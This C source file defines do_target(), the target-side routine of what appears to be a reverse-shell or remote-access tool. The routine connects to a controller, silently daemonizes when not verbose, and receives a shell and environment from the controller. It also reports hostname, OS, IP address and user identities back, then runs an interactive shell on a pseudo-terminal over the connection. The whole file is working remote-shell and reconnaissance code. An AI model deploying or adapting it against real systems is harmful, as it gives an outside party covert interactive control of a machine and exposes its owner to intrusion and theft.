
#include "common.h"


/***********************************************************************************************************************
 *
 * do_target()
 *
 * Input: Our io and config helper objects.
 *
 * Output: 0 for success, -1 on error.
 *
 * Purpose: This is the defining function for a target node.
 *
 **********************************************************************************************************************/
int do_target(struct io_helper *io, struct config_helper *config){

	int retval;

	char *pty_name;
	int pty_master, pty_slave;

	char **exec_argv;
	char **exec_envp;

	char *buff_head = NULL;

	struct winsize *tty_winsize;

	struct passwd *passwd_entry;

	struct sockaddr addr;
	socklen_t addrlen = (socklen_t) sizeof(addr);

	struct message_helper *message;

  struct utsname uname_info;


	/* We will be using the internal message struct inside of io quite a bit, so this will be a nice shorthand. */
	message = &io->message;

	/* Initialize the structures we will be using. */
	if((tty_winsize = (struct winsize *) calloc(1, sizeof(struct winsize))) == NULL){
		if(verbose){
			fprintf(stderr, "%s: %d: calloc(1, %d): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(int) sizeof(struct winsize), \
					strerror(errno));
		}
		return(-1);
	}

	/* Set up the network layer. */
	if(init_io_target(io, config) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: init_io_connect(%lx, %lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) config, \
					strerror(errno));
		}
		return(-1);
	}

	/* Set up the messaging layer. */
	if(negotiate_protocol(io) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: negotiate_protocol(%lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, \
					strerror(errno));
		}
		return(-1);
	}

	/*  - Agree on interactive / non-interactive mode. */
	message->data_type = DT_INIT;
	message->data_len = sizeof(config->interactive);
	memcpy(message->data, &config->interactive, sizeof(config->interactive));

	if(message_push(io) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: message->push(%lx): %s\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, \
					strerror(errno));
		}
		return(-1);
	}

	if(message_pull(io) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: message_pull(%lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, \
					strerror(errno));
		}
		return(-1);
	}

	if(message->data_type != DT_INIT){
		if(verbose){
			fprintf(stderr, "%s: %d: DT_INIT interactive: Protocol violation!\r\n", \
					program_invocation_short_name, io->controller);
		}
		return(-1);
	}

	if(!message->data[0]){
		config->interactive = 0;
	}

	if(!config->interactive){
		retval = broker(io, config);

#ifdef OPENSSL
		if(config->encryption){
			SSL_shutdown(io->ssl);
			SSL_free(io->ssl);
			SSL_CTX_free(io->ctx);
		}
#endif /* OPENSSL */

		return(retval);
	}

	if(!verbose){
		/*  - Become a daemon. */
		umask(0);

		retval = fork();

		if(retval == -1){
			return(-1);
		}else if(retval){
			exit(0);
		}

		if(setsid() == -1){
			return(-1);
		}

		if(chdir("/") == -1){
			return(-1);
		}
	}

	/*  - Receive and set the shell. */
	if(message_pull(io) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: message_pull(%lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, \
					strerror(errno));
		}
		return(-1);
	}

	if(message->data_type != DT_INIT){
		print_error(io, "%s: %d: invalid initialization: shell: Protocol violation!\r\n", \
				program_invocation_short_name, io->controller);
		return(-1);
	}


	if(!message->data_len){

		if(!config->shell){
			config->shell = DEFAULT_SHELL;
		}

	}else{

		if((config->shell = (char *) calloc(message->data_len + 1, sizeof(char))) == NULL){
			print_error(io, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io->controller, \
					message->data_len + 1, (int) sizeof(char), \
					strerror(errno));
			return(-1);
		}
		memcpy(config->shell, message->data, message->data_len);
	}

	/*  - Receive and set the initial environment. */
	if(message_pull(io) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: message_pull(%lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, \
					strerror(errno));
		}
		return(-1);
	}

	if(message->data_type != DT_INIT){
		if(verbose){
			fprintf(stderr, "%s: %d: DT_INIT environment: Protocol violation!\r\n", \
					program_invocation_short_name, io->controller);
		}
		return(-1);
	}

	/* I should learn to be more trusting. */
	message->data[message->data_len] = '\0';

	if((exec_envp = string_to_vector(message->data)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				message->data, strerror(errno));
		return(-1);
	}

	/*  - Receive and set the initial termios. */
	if(message_pull(io) == -1){
		if(verbose){
			fprintf(stderr, "%s: %d: message_pull(%lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, \
					strerror(errno));
		}
		return(-1);
	}

	if(message->data_type != DT_INIT){
		if(verbose){
			fprintf(stderr, "%s: %d: DT_INIT termios: Protocol violation!\r\n", \
					program_invocation_short_name, io->controller);
		}
		return(-1);
	}

	if(message->data_len != sizeof(tty_winsize->ws_row) + sizeof(tty_winsize->ws_col)){
		if(verbose){
			fprintf(stderr, "%s: %d: DT_INIT termios: not enough data!\r\n", \
					program_invocation_short_name, io->controller);
		}
		return(-1);
	}

	tty_winsize->ws_row = ntohs(*((unsigned short *) message->data));
	tty_winsize->ws_col = ntohs(*((unsigned short *) (message->data + sizeof(unsigned short))));


	/*  - Create a pseudo-terminal (pty). */
	if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
		print_error(io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		return(-1);
	}

	if(grantpt(pty_master) == -1){
		print_error(io, "%s: %d: grantpt(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		return(-1);
	}

	if(unlockpt(pty_master) == -1){
		print_error(io, "%s: %d: unlockpt(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		return(-1);
	}

	if(ioctl(pty_master, TIOCSWINSZ, tty_winsize) == -1){
		print_error(io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, TIOCGWINSZ, (unsigned long) tty_winsize, strerror(errno));
		return(-1);
	}

	if((pty_name = ptsname(pty_master)) == NULL){
		print_error(io, "%s: %d: ptsname(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		return(-1);
	}

	if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
		print_error(io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_name, strerror(errno));
		return(-1);
	}

	/*  - Send basic information back to the controller about the connecting host. */
	if((buff_head = (char *) calloc(LOCAL_BUFF_SIZE, sizeof(char))) == NULL){
		print_error(io, "%s: %d: calloc(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				LOCAL_BUFF_SIZE, (int) sizeof(char), \
				strerror(errno));
		return(-1);
	}

  if(uname(&uname_info) == -1){
    if(verbose){
      fprintf(stderr, "%s: uname(%lx): %s\r\n", \
          program_invocation_short_name, \
          (unsigned long) &uname, \
          strerror(errno));
    }
    return(-1);
  }

  remote_printf(io, "################################################################################\r\n");
  remote_printf(io, "# Hostname:\t\t%s\r\n", uname_info.nodename);
  remote_printf(io, "# OS Name:\t\t%s\r\n", uname_info.sysname);
  remote_printf(io, "# OS Release:\t\t%s\r\n", uname_info.release);
  remote_printf(io, "# OS Version:\t\t%s\r\n", uname_info.version);
  remote_printf(io, "# Arch:\t\t\t%s\r\n", uname_info.machine);


  remote_printf(io, "# IP Address:\t\t");
  if(getsockname(io->remote_fd, &addr, &addrlen) != -1){
    memset(buff_head, 0, LOCAL_BUFF_SIZE);
    if(inet_ntop(addr.sa_family, addr.sa_data + 2, buff_head, LOCAL_BUFF_SIZE - 1)){
      remote_printf(io, "%s", buff_head);
    }
  }

  if(!buff_head[0]){
    remote_printf(io, "I have no address!");
  }
  remote_printf(io, "\r\n");

  /*  if the uid doesn't match an entry in /etc/passwd, we don't want to crash. */
  /*  Borrowed the "I have no name!" convention from bash. */
  passwd_entry = getpwuid(getuid());
  remote_printf(io, "# Real User:\t\t");
  if(passwd_entry && passwd_entry->pw_name){
    remote_printf(io, "%s", passwd_entry->pw_name);
  }else{
    remote_printf(io, "I have no name!");
  }
  remote_printf(io, "\r\n");

  passwd_entry = getpwuid(geteuid());
  remote_printf(io, "# Effective User:\t");
  if(passwd_entry && passwd_entry->pw_name){
    remote_printf(io, "%s", passwd_entry->pw_name);
  }else{
    remote_printf(io, "I have no name!");
  }
  remote_printf(io, "\r\n");

  remote_printf(io, "################################################################################\r\n");

	free(buff_head);

	if(close(STDIN_FILENO) == -1){
		print_error(io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		return(-1);
	}

	if(close(STDOUT_FILENO) == -1){
		print_error(io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		return(-1);
	}

	if(!verbose){
		if(close(STDERR_FILENO) == -1){
			print_error(io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
					program_invocation_short_name, io->controller, \
					strerror(errno));
			return(-1);
		}
	}

	/*  - Fork a child to run the shell. */
	retval = fork();

	if(retval == -1){
		print_error(io, "%s: %d: fork(): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		return(-1);
	}

	if(retval){

		io->child_sid = retval;

		/*  - Parent: Enter broker() and broker tty. */
		if(close(pty_slave) == -1){
			print_error(io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io->controller, \
					pty_slave, strerror(errno));
			return(-1);
		}

		io->local_in_fd = pty_master;
		io->local_out_fd = pty_master;

		retval = broker(io, config);

		if(retval == -1 && !io->eof){
			print_error(io, "%s: %d: broker(%lx, %lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) config, strerror(errno));
			return(-1);
		}

#ifdef OPENSSL
		if(config->encryption){
			SSL_shutdown(io->ssl);
			SSL_free(io->ssl);
			SSL_CTX_free(io->ctx);
		}
#endif /* OPENSSL */

		return(0);
	}

	/*  - Child: Initialize file descriptors. */
	if(close(pty_master) == -1){
		print_error(io, "%s: %d: close(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_master, strerror(errno));
		return(-1);
	}
	if(dup2(pty_slave, STDIN_FILENO) == -1){
		print_error(io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, strerror(errno));
		return(-1);
	}

	if(dup2(pty_slave, STDOUT_FILENO) == -1){
		print_error(io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, strerror(errno));
		return(-1);
	}

	if(dup2(pty_slave, STDERR_FILENO) == -1){
		print_error(io, "%s: %d: dup2(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, STDERR_FILENO, strerror(errno));
		return(-1);
	}

	if(close(io->remote_fd) == -1){
		print_error(io, "%s: %d: close(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				io->remote_fd, strerror(errno));
		return(-1);
	}

	if(close(pty_slave) == -1){
		print_error(io, "%s: %d: close(%d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				pty_slave, strerror(errno));
		return(-1);
	}

	if(setsid() == -1){
		print_error(io, "%s: %d: setsid(): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		return(-1);
	} 

	/*  - Child: Set the pty as controlling. */
	if(ioctl(STDIN_FILENO, TIOCSCTTY, 1) == -1){
		print_error(io, "%s: %d: ioctl(STDIN_FILENO, TIOCSCTTY, 1): %s\r\n", \
				program_invocation_short_name, io->controller, \
				strerror(errno));
		return(-1);
	}

	/*  - Child: Call execve() to invoke a shell. */
	errno = 0;
	if((exec_argv = string_to_vector(config->shell)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->shell, \
				strerror(errno));
		return(-1);
	}

	execve(exec_argv[0], exec_argv, exec_envp);

	print_error(io, "%s: %d: execve(%s, %lx, %lx): %s\r\n", \
			program_invocation_short_name, io->controller, \
			exec_argv[0], (unsigned long) message->data_type, (unsigned long) exec_envp, \
			strerror(errno));
	return(-1);
}
